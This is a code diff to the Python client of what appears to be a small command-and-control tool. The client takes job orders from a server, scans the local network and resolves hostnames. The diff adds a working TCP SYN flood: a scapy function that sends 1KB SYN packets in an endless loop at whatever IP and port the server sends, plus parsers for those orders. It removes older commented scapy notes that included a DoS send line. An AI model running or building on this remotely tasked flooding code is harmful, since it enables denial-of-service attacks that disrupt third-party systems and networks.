@@ -1,8 +1,8 @@
 # INSTRUCTIONS:
 # 1) Change the SERVER const to match your machine's server
 # 2) Change jobs instructions to match IPs and Machines that are online on your network
-# 2) run server.py first
-# 3) run client.py with administrator priviledges
+# 3) run server.py first
+# 4) run client.py with administrator priviledges
 
 # JOBS:
 # ONE TO ONE
@@ -15,7 +15,8 @@
 # 3) UDP flood attack on IP/Port
 
 import socket  # socket object will be used to make the connection
-from scapy.all import ARP, Ether, srp
+#from scapy.all import ARP, Ether, srp
+from scapy.all import *
 
 
 # CONSTANTS
@@ -29,6 +30,8 @@ ADDR = (SERVER, PORT)  # ADDRESS WILL BE TUPLE OF IP ADDRESS OF SERVER AND PORT#
 # CREATE NEW VARIABLE CALLED CLIENT AND MAKE IT AN OBJECT OF THIS CONNECTION
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)  # CLIENT CONNECTS TO ABOVE IP ADDRESS
+# '[HELLO]' protocol establishes the connection with server
+GREETING_MSG = '[HELLO] Hello World!'
 
 
 def sendMsgToServer(msg):  # sends msg to server
@@ -43,10 +46,6 @@ def sendMsgToServer(msg):  # sends msg to server
     client.send(message)  # send encoded message to server
 
 
-def greetingMsg():  # '[HELLO]' protocol establishes the connection with server
-    return '[HELLO] Hello World!'
-
-
 def sendClnts(client_lst):  # takes string list of clients and sends them to the server
     sendMsgToServer(
         "The Following Devices are currently connected to the network: ")
@@ -56,23 +55,30 @@ def sendClnts(client_lst):  # takes string list of clients and sends them to the
 
 # will take a job order from the server and execute the order.
 def jobHandler(string):
+    jobRes = "Job Error"
     # the first portion of the string specifies which job to execute, this is standard in the protcol
     PROTOCOL_MSG = string[0:6]
     if PROTOCOL_MSG == '[IP#1]':
         # 49:65 is the location of the IP address of protocol IP#1
         target_ip = parseIP1(string)
-        client_list = checkAllIPs(target_ip)
-        return client_list
+        jobRes = checkAllIPs(target_ip)
+        return jobRes
     elif PROTOCOL_MSG == '[IP#2]':
         # 10:26 is the location of the IP address of protocol IP#2
         target_ip = parseIP2_3(string)
         hostname = 'none'
-        return checkOneIP(target_ip, hostname)
+        jobRes = checkOneIP(target_ip, hostname)
+        return jobRes
     elif PROTOCOL_MSG == '[IP#3]':
         target_ip = 'none'
         hostname = parseIP2_3(string)
-        isIPResult = checkOneIP(target_ip, hostname)
-        return isIPResult
+        jobRes = checkOneIP(target_ip, hostname)
+        return jobRes
+    elif PROTOCOL_MSG == '[TCPF]':
+        target_ip = parseFloodIP(string)
+        port_num = int(parseFloodPort(string))
+        jobRes = TCPFlood(target_ip, port_num)
+        return jobRes
 
 
 # takes an ip, finds out all the connections in its subnet.
@@ -144,7 +150,22 @@ def parseIP2_3(string):
     return substring
 
 
+def parseFloodIP(string):
+    start = string.find('Flood ') + len('Flood ')
+    end = string.find(' at')
+    substring = string[start:end]
+    return substring
+
+
+def parseFloodPort(string):
+    start = string.find('number ') + len('number ')
+    end = len(string)
+    substring = string[start:end]
+    return substring
+
 # given a list of IPs, it finds the associated hostnames and returns a list
+
+
 def findHostNames(ip_lst):
     nameLst = []
     for IP in ip_lst:
@@ -158,7 +179,23 @@ def findHostNames(ip_lst):
     return nameLst
 
 
-sendMsgToServer(greetingMsg())  # first message to send
+def TCPFlood(target_ip, port_num):
+    ip = IP(dst=target_ip)
+    # creates TCP packet with random source port, flag S means we're sending SYN (first part of handshake) msg for TCP
+    tcp = TCP(sport=RandShort(), dport=port_num, flags="S")
+    payload = Raw(b"TCPFLOOD"*128)  # 1KB of data will be sent
+    p = ip / tcp / payload  # will stack up the layers
+    # sends constructed packet until Ctrl+C is pressed
+    print(
+        f"Now Flooding {target_ip} at Port {port_num} please press Ctrl+C in 5 seconds")
+    send(p, loop=1, verbose=0)
+    return f"Successfully Flooded IP Address {target_ip} At Port Number {port_num}"
+
+
+# def UDPFlood(target_ip, port_num):
+
+
+sendMsgToServer(GREETING_MSG)  # first message to send
 input()
 rcvd_msg = client.recv(2048).decode(FORMAT)
 print(rcvd_msg)  # print receive message from server
@@ -171,10 +208,6 @@ if isinstance(jobResult, list):  # if the result is a list it means list of IPs 
 else:
     sendMsgToServer(jobResult)
 
-# clients = jobHandler(rcvd_msg[0:6], rcvd_msg[49:65]) FOR CHECKALLIPS
-# isBlankOnline = checkOneIP('none', rcvd_msg[10:19]) FOR CHECKONEIP HOSTNAME
-# sendMsgToServer(isBlankOnline)
-
 
 input()
 
@@ -182,12 +215,3 @@ input()
 input()
 sendMsgToServer("Disconnecting now!")  # disconnect message
 sendMsgToServer(DISCONNECT_MESSAGE)  # send disconnect message
-
-
-# scapy
-# SENDING
-# send(IP(src="192.168.1.103",dst="192.168.1.1")/ICMP()/"HelloWorld")   the first / separates the protocol from the header data.
-# SNIFFING
-# sniff(iface="wlp4s0", prn=lambda x:x.summary)
-# DOSSING
-# send(IP(src="192.168.1.103", dst="192.168.1.1")/TCP(sport=80, dport=80), count=10000)
